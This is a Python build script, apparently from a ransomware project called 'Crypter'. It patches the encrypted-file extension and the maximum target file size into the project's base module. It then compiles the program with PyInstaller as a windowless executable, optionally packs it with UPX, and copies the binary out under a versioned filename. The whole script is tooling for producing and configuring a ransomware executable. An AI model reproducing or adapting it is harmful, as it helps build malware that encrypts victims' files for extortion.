# This script facilitates the building of Crypter

# Import libs
import shutil
import os
import sys
import json
import re
from time import strftime

#################
## Build Class ## 
#################

class build():
  # Class to provide build object

  def __init__(self):
    # Init object
    self.config = self.config_handler()
    self.build_dir = ".\\"
    self.dev_dir = "..\\Crypter"
    self.ico_location = self.config['ico_file']
    self.main = self.dev_dir + "\\Main.py"
    self.base = self.dev_dir + "\\Base.py"
    self.spec_file = self.build_dir + "\\Main.spec"

    # Pre-reqs check
    self.check_prereqs()

    # Update base module
    self.update_base()

    # Start build process
    if not os.path.isfile("upx394w\\upx.exe"):
      os.system(r"pyinstaller --noconsole --clean --noupx Main.spec")
    else:
      os.system(r"pyinstaller --noconsole --clean --upx-dir upx394w Main.spec")

    # Copy binary to dev folder
    self.copy_files("binary")

  
  def check_prereqs(self):
    # Function to check build prereq status

    # Run Pyinstaller and check it is installed

    pass


  def update_base(self):
    # Function to update the base module's variables

    # Update encrypted extension
    # Read base file
    fh = open(self.base, "r")
    contents = fh.read()
    fh.close()

    # Replace encrypted file extension
    replacement = "ENCRYPTED_EXTENSION = \".%s\"" % self.config["encrypted_extension"]
    new_contents = re.sub("ENCRYPTED_EXTENSION = \"(.*)\"", replacement, contents)

    # Replace max file size
    replacement = "MAX_FILE_SIZE_BYTES = %s" % (int(self.config["max_file_size_mb"]) * 1024 * 1024)
    new_contents = re.sub("MAX_FILE_SIZE_BYTES = (.*)", replacement, new_contents)
    
    # Write out new contents
    fh = open(self.base, "w")
    fh.write(new_contents)
    fh.close()


  def config_handler(self):
    # Function to handle loading of configuration file

    # Open file and load JSON
    fh = open("BuildConfig.txt", "r")
    config = json.loads(fh.read())
    fh.close()

    return config


  def get_release(self):
    # Function to return the release number

    # Get Release
    year = int(strftime("%y")[0]) + int(strftime("%y")[1])
    if year <= 9:
      year = "0" + str(year)
    day = strftime("%j")
    release = year + str(day)

    return release


  def copy_files(self, _type):
    # Function copy Ransom files to build dir
    files_to_copy = []

    # IF build files
    if _type == "build_files":
      src = self.dev_dir + "\\"
      dst = self.build_dir + "\\"
      # Walk dir and fetch py files
      for x in os.listdir(self.dev_dir):
        if x[-2:] == "py":
          files_to_copy.append(x)

      # Now copy files to build dir
      for x in files_to_copy:
        shutil.copy(str(src + x),  str(dst + x))

    # IF Binary
    else:

      # Get release
      release = self.get_release()

      filename = "%s-%s.%s-%s.%s.exe" % (self.config['filename'],
                                         self.config['maj'],
                                         self.config['min'],
                                         release,
                                         self.config['extension'])

      src = self.build_dir + "dist\\"
      dst = "..\\bin\\"

      # Check that bin dir exists
      if not os.path.isdir(dst):
        os.mkdir(dst)

      files_to_copy.append("Main.exe")


      # Now copy files to build dir
      for x in files_to_copy:
        shutil.copy(str(src + x),  str(dst + filename))

if __name__ == "__main__":
  build_handle = build()

